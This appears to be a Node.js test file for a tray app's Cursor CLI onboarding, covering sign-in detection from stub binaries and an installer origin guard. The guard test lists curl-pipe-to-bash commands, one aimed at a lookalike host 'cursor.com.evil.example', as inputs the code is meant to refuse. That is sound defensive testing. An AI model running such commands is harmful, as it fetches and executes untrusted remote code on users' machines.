import assert from "node:assert/strict";
import { chmodSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";

const stateDir = mkdtempSync(path.join(os.tmpdir(), "cursor-signin-test-"));
process.env.MODEL_ROUTER_STATE_DIR = stateDir;

const { cursorSignedIn, parseCursorModels } = await import("../src/cursor-cli.mjs");
const {
  hasSignInCli,
  installOauthCli,
  oauthLoginArgs,
  providerOnboardingSnapshot,
} = await import("../src/provider-onboarding.mjs");

// A stand-in for `cursor-agent status`, which exits 0 whether or not anybody
// is signed in -- the answer is only ever in the text.
function fakeStatus(text, { exitCode = 0 } = {}) {
  const directory = mkdtempSync(path.join(os.tmpdir(), "cursor-status-stub-"));
  const binary = path.join(directory, "cursor-agent");
  writeFileSync(
    binary,
    `#!/usr/bin/env node\nprocess.stdout.write(${JSON.stringify(text)});\nprocess.exit(${exitCode});\n`,
    { mode: 0o755 },
  );
  chmodSync(binary, 0o755);
  return binary;
}

test("signed out is read from the text, not the exit code", () => {
  const binary = fakeStatus("Not logged in\n");
  const status = cursorSignedIn({ environment: { ...process.env, CURSOR_AGENT: binary } });
  assert.equal(status.installed, true);
  assert.equal(status.signedIn, false, "cursor-agent exits 0 while signed out");
});

test("a signed-in account reads as signed in", () => {
  const binary = fakeStatus("Logged in as duola@hypercho.com\n");
  const status = cursorSignedIn({ environment: { ...process.env, CURSOR_AGENT: binary } });
  assert.equal(status.signedIn, true);
});

test("silence is unknown, not signed in", () => {
  const binary = fakeStatus("");
  const status = cursorSignedIn({ environment: { ...process.env, CURSOR_AGENT: binary } });
  assert.equal(status.signedIn, false);
  assert.equal(status.unknown, true, "a reworked status message must degrade to 'cannot tell'");
});

// `commandOnPath` shells out to `which`, which reads the real process
// environment rather than the object handed to cursorAgentPath -- so hiding
// the binary means mutating process.env, not passing a different PATH in.
function withoutCursorAgent(run) {
  const saved = { PATH: process.env.PATH, HOME: process.env.HOME, CURSOR_AGENT: process.env.CURSOR_AGENT };
  process.env.PATH = "/nonexistent";
  process.env.HOME = mkdtempSync(path.join(os.tmpdir(), "cursor-nohome-"));
  delete process.env.CURSOR_AGENT;
  try {
    return run();
  } finally {
    for (const [key, value] of Object.entries(saved)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  }
}

test("a missing binary is reported as not installed rather than throwing", () => {
  const status = withoutCursorAgent(() => cursorSignedIn());
  assert.equal(status.installed, false);
  assert.equal(status.signedIn, false);
});

test("cursor-cli is a sign-in provider and signs in with `login`", () => {
  assert.equal(hasSignInCli("cursor-cli"), true);
  assert.deepEqual(oauthLoginArgs("cursor-cli"), ["login"]);
});

test("a missing cursor-agent is an install action, not a dead end", () => {
  // This used to assert a refusal that told the user to run curl themselves.
  // That is a dead end for anyone who is not already a developer, and the npm
  // siblings of this CLI are installed by the very same button, so the tray
  // now installs Cursor too. What keeps that defensible is the origin guard
  // exercised below, plus fetching the script before running it.
  withoutCursorAgent(() => {
    const row = providerOnboardingSnapshot().providers.find((p) => p.id === "cursor-cli");
    assert.equal(row.cliInstalled, false);
    assert.equal(row.action, "install", "the tray must offer to install it");
  });
});

test("the tray row tells the truth about a signed-out CLI", () => {
  const row = providerOnboardingSnapshot().providers.find((p) => p.id === "cursor-cli");
  assert.ok(row, "cursor-cli must appear in the onboarding snapshot");
  // Presented as oauth so the tray renders its sign-in button; a keyless row
  // would render "ready" and there would be nothing to click.
  assert.equal(row.kind, "oauth");
  assert.ok(
    ["install", "login", "ready"].includes(row.action),
    `unexpected action ${row.action}`,
  );
  // The bug this replaced: keyless meant configured:true forever, so the tray
  // claimed Cursor was connected while cursor-agent was signed out.
  assert.equal(
    row.configured,
    row.action === "ready",
    "configured must track the CLI's real sign-in state",
  );
});

test("model listing survives real chalk decoration", () => {
  assert.deepEqual(parseCursorModels("Available models\n\ngpt-5 - GPT-5 (default)\n"), ["gpt-5"]);
});

// --- installer guards ----------------------------------------------------
// The button now fetches and runs Cursor's install script, so the guard that
// keeps that defensible has to be exercisable without downloading 200MB.

const { installScriptOrigin, signInCliDescriptor } = await import(
  "../src/provider-onboarding.mjs"
);

test("the installer URL is pinned to Cursor's own host", () => {
  const cursor = signInCliDescriptor("cursor-cli");
  assert.equal(installScriptOrigin(cursor).hostname, "cursor.com");
  assert.equal(installScriptOrigin(cursor).protocol, "https:");
});

test("an installer pointed anywhere else is refused before it runs", () => {
  for (const command of [
    "curl https://cursor.com.evil.example/install | bash",
    "curl https://raw.githubusercontent.com/x/y/install.sh | bash",
    "curl http://cursor.com/install | bash",
  ]) {
    assert.throws(
      () => installScriptOrigin({ executable: "cursor-agent", installCommand: command, installHost: "cursor.com" }),
      /Refusing to run an installer|Invalid URL/,
      `${command} must not be fetched`,
    );
  }
});

test("a descriptor with no install URL cannot silently run nothing", () => {
  assert.throws(
    () => installScriptOrigin({ executable: "x", installCommand: "make install", installHost: "cursor.com" }),
    /no install URL/,
  );
});
